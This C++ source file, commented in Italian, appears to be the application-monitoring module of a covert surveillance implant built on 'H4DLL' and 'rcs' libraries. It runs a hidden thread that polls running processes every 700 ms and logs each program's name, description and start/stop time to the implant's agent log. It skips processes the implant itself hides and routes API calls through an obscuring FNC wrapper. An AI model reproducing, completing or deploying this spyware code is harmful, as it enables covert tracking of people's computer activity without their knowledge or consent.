#define _CRT_SECURE_NO_WARNINGS 1

#include <Windows.h>
#include <cJSON/cJSON.h>
#include <time.h>
#include "../../H4DLL/common.h"
#include "../../H4DLL/H4-DLL.h"
#include "../../H4DLL/bss.h"
#include "../../H4DLL/AM_Core.h"
#include "../../H4DLL/HM_IpcModule.h"
#include "../../H4DLL/HM_InbundleHook.h"
#include <rcs/bin_string.h>
#include <rcs/list.h>
#include "../../H4DLL/LOG.h"

BOOL bPM_ApplicationStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_appcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hApplicationThread = NULL;

#define PROC_DESC_LEN 100

typedef struct _application_entry
{
	LIST_ENTRY entry;
	BOOL is_free;
	WCHAR proc_name[50];
	WCHAR proc_desc[PROC_DESC_LEN];
	DWORD PID;
	BOOL is_hidden;
	BOOL still_present;
} APPLICATION_ENTRY;

struct LANGANDCODEPAGE
{
	WORD wLanguage;
	WORD wCodePage;
};

static LIST_ENTRY entries = { &entries, &entries };

static void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
{
	struct LANGANDCODEPAGE* lpTranslate;

	UINT cbTranslate = 0, cbDesc = 0;
	HANDLE hproc = NULL;
	BYTE* file_info = NULL;
	WCHAR *desc_ptr;
	DWORD info_size, dummy;
	WCHAR process_path[MAX_PATH+1];
	WCHAR file_desc_name[128];
	
	// Se non riesce a prendere la desc, torna una stringa vuota
	if (desc_len_in_word > 0)
		description[0] = 0;
	
	do
	{
		if ((hproc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID)) == NULL)
			break;

		if (FNC(GetModuleFileNameExW)(hproc, NULL, process_path, sizeof(process_path) / sizeof(WCHAR)) == 0)
			break;

		if ((info_size = FNC(GetFileVersionInfoSizeW)(process_path, &dummy)) == 0)
			break;

		if ((file_info = (BYTE*)malloc(info_size)) == NULL)
			break;

		if (!FNC(GetFileVersionInfoW)(process_path, NULL, info_size, file_info))
			break;

		if (!FNC(VerQueryValueW)(file_info, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE))
			break;

		swprintf_s(file_desc_name, sizeof(file_desc_name) / sizeof(WCHAR), L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);

		if (FNC(VerQueryValueW)(file_info, file_desc_name, (LPVOID*)&desc_ptr, &cbDesc) && cbDesc > 0)
			_snwprintf_s(description, desc_len_in_word, _TRUNCATE, L"%s", desc_ptr);

	} while (false);

	if (hproc != NULL)
		CloseHandle(hproc);

	if (file_info != NULL)
		free(file_info);
}

static bool is_free(APPLICATION_ENTRY* entry)
{
	if (entry->is_free)
		return true;

	return false;
}

static void reset_still_present(APPLICATION_ENTRY* entry)
{
	entry->still_present = FALSE;
}

static BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
{
	APPLICATION_ENTRY *temp_array = NULL;
	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
	BOOL is_hidden = FALSE;

	SET_PID_HIDE_STRUCT(pid_hide, PID);
	if (AM_IsHidden(HIDE_PID, &pid_hide))
		is_hidden = TRUE;

	APPLICATION_ENTRY* temp = find_entry_in_list<APPLICATION_ENTRY>(&entries, is_free);

	if (temp != NULL) // Cerca di inserirlo in un elemento libero 
	{
		_snwprintf_s(temp->proc_name, sizeof(temp->proc_name) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);
		_snwprintf_s(temp->proc_desc, sizeof(temp->proc_desc) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);
		temp->PID = PID;
		temp->still_present = TRUE;
		temp->is_hidden = is_hidden;
		temp->is_free = FALSE;
		return !is_hidden;	// if it's true, do not write into the log
	}

	temp = (APPLICATION_ENTRY *)malloc(sizeof(APPLICATION_ENTRY));
	if (temp != NULL)
	{
		_snwprintf_s(temp->proc_name, sizeof(temp->proc_name) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);
		_snwprintf_s(temp->proc_desc, sizeof(temp->proc_desc) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);
		temp->PID = PID;
		temp->still_present = TRUE;
		temp->is_hidden = is_hidden;
		temp->is_free = FALSE;

		insert(&entries, temp);
		
		return !is_hidden; //Non lo fa scrivere nel log
	}

	return FALSE;
}

static void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
{
	// Costruisce e scrive il log sequenziale
	bin_buf tolog;
	struct tm tstamp;
	DWORD delimiter = ELEM_DELIMITER;

	// XXX Non logga il processo SearchFilter
	if (!_wcsicmp(proc_name, L"SearchFilterHost.exe"))
		return;

	GET_TIME(tstamp);
	
	write_buff(tolog, &tstamp);
	write_buff(tolog, proc_name);
	
	write_buff(tolog, (is_started) ? L"START" : L"STOP");
	write_buff(tolog, proc_desc);
	write_buff(tolog, &delimiter);

	LOG_ReportLog(PM_APPLICATIONAGENT, tolog.get_buf(), tolog.get_len());
}

static bool search_by_pid(APPLICATION_ENTRY* entry, DWORD dwPid)
{
	if (entry->PID == dwPid && entry->is_free == FALSE)
		return true;

	return false;
}

static bool not_present(APPLICATION_ENTRY* entry)
{
	if (entry->is_free == FALSE && entry->still_present == FALSE)
		return true;

	return false;
}

static bool report_and_reset(APPLICATION_ENTRY* entry)
{
	ReportApplication(entry->proc_name, entry->proc_desc, FALSE);
	entry->is_free = TRUE;
	return true;
}

static DWORD WINAPI MonitorNewApps(DWORD dummy)
{
	HANDLE proc_list;
	PROCESSENTRY32W lppe;
	BOOL first_loop = FALSE;
	BOOL proc_found;
	WCHAR proc_desc[PROC_DESC_LEN];

	// Alla prima passata costruisce la lista (senza riportare i delta)
	if (list_size(&entries) == 0)
		first_loop = TRUE; 

	LOOP{
		// Resetta a tutti i processi il flag per vedere quelli che ci sono ancora
		apply_in_list<APPLICATION_ENTRY>(&entries, reset_still_present);

		// Cicla i processi attivi 
		if ( (proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE ) {
			lppe.dwSize = sizeof(PROCESSENTRY32W);
			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
				do {
					proc_found = FALSE;

					APPLICATION_ENTRY* in_list = find_entry_in_list<APPLICATION_ENTRY>(&entries, search_by_pid, lppe.th32ProcessID);

					if (in_list)
					{
						in_list->still_present = TRUE;
						proc_found = TRUE;
						break;
					}

					// altrimenti lo aggiunge
					if (!proc_found) {
						GetProcessDescription(lppe.th32ProcessID, proc_desc, PROC_DESC_LEN);
						if (ApplicationInsertInList(lppe.szExeFile, proc_desc, lppe.th32ProcessID) && !first_loop) 
							ReportApplication(lppe.szExeFile, proc_desc, TRUE);
					}
				} while(FNC(Process32NextW)(proc_list, &lppe));
			}
			CloseHandle(proc_list);
		}

		search_and_change<APPLICATION_ENTRY>(&entries, not_present, report_and_reset);

		first_loop = FALSE;
		CANCELLATION_POINT(bPM_appcp);
		Sleep(700);
	}
}

static DWORD WINAPI PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	if (bStartFlag) {
		if (!bPM_ApplicationStarted) {
			LOG_InitAgentLog(PM_APPLICATIONAGENT);
			hApplicationThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewApps, NULL, 0, &dummy);
		}
	} else {
		if (bPM_ApplicationStarted) {
			QUERY_CANCELLATION(hApplicationThread, bPM_appcp);
			LOG_StopAgentLog(PM_APPLICATIONAGENT);
		}

		// Solo se e' stato stoppato esplicitamente cancella la lista 
		if (bReset) {
			remove_all<APPLICATION_ENTRY>(&entries, free);
		}
	}

	bPM_ApplicationStarted = bStartFlag;

	return 1;
}

static DWORD WINAPI PM_ApplicationInit(cJSON* elem)
{
	return 1;
}

void PM_ApplicationRegister()
{
	AM_MonitorRegister("application", PM_APPLICATIONAGENT, NULL, (BYTE *)PM_ApplicationStartStop, (BYTE *)PM_ApplicationInit, NULL);
}